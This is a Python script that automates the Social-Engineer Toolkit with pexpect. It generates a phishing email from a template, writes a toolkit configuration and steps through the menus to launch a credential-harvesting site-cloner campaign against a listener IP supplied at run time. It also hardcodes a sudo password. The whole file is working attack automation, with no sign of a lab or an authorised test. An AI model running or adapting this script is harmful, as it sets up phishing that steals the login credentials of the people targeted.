import os
import pexpect
import logging

# Setup logging
logfile_path = os.path.join(os.path.abspath(os.path.dirname(__file__)), "set_debug.log")
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[logging.FileHandler(logfile_path, 'a'), logging.StreamHandler()])

# Paths and constants
SET_PATH = "/usr/share/set"
SET_SCRIPT = os.path.join(SET_PATH, "setoolkit")
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
EMAIL_TEMPLATE = os.path.join(CURRENT_DIR, "email_template.txt")
CONFIG_TEMPLATE = os.path.join(CURRENT_DIR, "config_template.txt")
CONFIG_DIR = os.path.join(CURRENT_DIR, "config")
CONFIG_FILE = os.path.join(CONFIG_DIR, "set_config")

# Function to generate phishing email
def generate_phishing_email():
    logging.info("Generating phishing email...")
    with open(EMAIL_TEMPLATE, "r") as template:
        email_content = template.read()
    
    with open("email_campaign.txt", "w") as campaign:
        campaign.write(email_content)
    logging.info("Phishing email generated.")

# Function to configure SET
def configure_set():
    logging.info("Configuring SET...")
    if not os.path.exists(CONFIG_DIR):
        os.makedirs(CONFIG_DIR)
    
    with open(CONFIG_TEMPLATE, "r") as template:
        config_content = template.read()
    
    with open(CONFIG_FILE, "w") as config:
        config.write(config_content)
    logging.info("SET configured.")

# Function to run SET campaign
def run_set_campaign():
    logging.info("Running SET campaign...")
    if not os.path.isfile(SET_SCRIPT):
        raise FileNotFoundError(f"setoolkit script not found at {SET_SCRIPT}")
    
    os.chdir(SET_PATH)

    # Start the SET toolkit
    child = pexpect.spawn("sudo python3 setoolkit", timeout=600, logfile=open(logfile_path, "ab"))
    
    try:
        child.expect("[sudo] password for", timeout=60)
        child.sendline("kali")  # Replace 'kali' with your actual sudo password
        logging.info("Entered sudo password.")
        
        child.expect("Do you agree to the terms of service.*", timeout=60)
        child.sendline("y")
        logging.info("Agreed to terms of service.")
        
        child.expect("Select from the menu.*", timeout=60)
        child.sendline("1")
        logging.info("Selected Social-Engineering Attacks.")
        
        child.expect("Select from the menu.*", timeout=60)
        child.sendline("2")
        logging.info("Selected Website Attack Vectors.")
        
        child.expect("Select from the menu.*", timeout=60)
        child.sendline("3")
        logging.info("Selected Credential Harvester Attack Method.")
        
        child.expect("Select from the menu.*", timeout=60)
        child.sendline("2")
        logging.info("Selected Site Cloner.")
        
        ip_address = input("Enter the IP address for the payload listener: ")
        child.expect("IP address for the payload listener.*", timeout=60)
        child.sendline(ip_address)
        logging.info(f"Entered IP address for the payload listener: {ip_address}")
        
        child.expect("Press <return> to continue.*", timeout=60)
        child.sendline("")
        logging.info("Pressed return to continue.")
        
        child.expect("Select from the menu.*", timeout=60)
        child.sendline("2")
        logging.info("Selected Credential Harvester Method.")
        
        child.expect("SET has finished configuration.*", timeout=60)
        logging.info("SET finished configuration and campaign is running.")
        
        # Wait for SET to complete the task
        child.expect(pexpect.EOF)
        logging.info("SET campaign completed.")
    except pexpect.TIMEOUT:
        logging.error("Interaction with SET timed out.")
    except pexpect.EOF:
        logging.error("Unexpected end of file from SET.")
    finally:
        child.close()

if __name__ == "__main__":
    generate_phishing_email()
    configure_set()
    run_set_campaign()
